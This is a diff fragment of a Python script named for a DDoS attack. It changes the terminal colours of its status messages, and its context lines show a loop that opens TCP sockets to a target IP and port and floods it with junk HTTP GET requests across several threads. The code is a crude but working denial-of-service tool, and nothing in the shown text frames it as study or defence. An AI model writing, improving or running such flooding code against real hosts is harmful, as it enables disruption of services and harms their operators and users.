@@ -7,12 +7,12 @@ def ddos():
    while True:
       mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       try:
-          print("Success!")
+          print("\033[1;32;40mSuccess!")
           mysocket.connect((ip, port))
           mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
           mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
       except socket.error:
-         print("\033[1;32;40merror")
+         print("\033[1;31;40merror")
          mysocket.close()
 
    for i in range(threads):
